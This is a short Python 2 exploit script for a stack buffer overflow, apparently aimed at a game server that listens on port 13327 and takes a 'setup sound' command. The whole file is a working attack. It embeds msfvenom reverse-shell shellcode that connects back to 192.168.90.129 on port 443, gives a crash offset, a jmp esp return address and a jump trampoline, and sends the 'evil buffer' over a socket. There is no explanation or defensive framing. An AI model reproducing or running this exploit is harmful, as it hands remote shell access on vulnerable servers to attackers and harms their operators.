#!/usr/bin/env python
import socket

host = '127.0.0.1'

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.90.129 LPORT=443 -a x86 --platform linux -b '\x00\x20' -f c
# 95 bytes
shellcode = ("\xba\x5a\x14\xf0\x95\xd9\xee\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x12\x31\x50\x12\x83\xe8\xfc\x03\x0a\x1a\x12\x60\x9b\xf9\x25"
"\x68\x88\xbe\x9a\x05\x2c\xc8\xfc\x6a\x56\x07\x7e\x19\xcf\x27"
"\x40\xd3\x6f\x0e\xc6\x12\x07\x51\x90\xbf\x56\x39\xe3\x3f\x59"
"\x01\x6a\xde\xe9\x13\x3d\x70\x5a\x6f\xbe\xfb\xbd\x42\x41\xa9"
"\x55\x33\x6d\x3d\xcd\xa3\x5e\xee\x6f\x5d\x28\x13\x3d\xce\xa3"
"\x35\x71\xfb\x7e\x35")

crash = shellcode + '\x41' * (4368-95)		# offset 4368
crash += '\xef\x5a\x13\x08'			# ret addr; jmp esp
crash += '\x83\xC0\x0C\xFF\xE0'			# add eax,12 y jmp eax
crash += '\x43'*(4379-4368-4-5)			# padding

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
s.send(buffer)
data = s.recv(1024)
print data
s.close()
print "[*]Payload sent !"
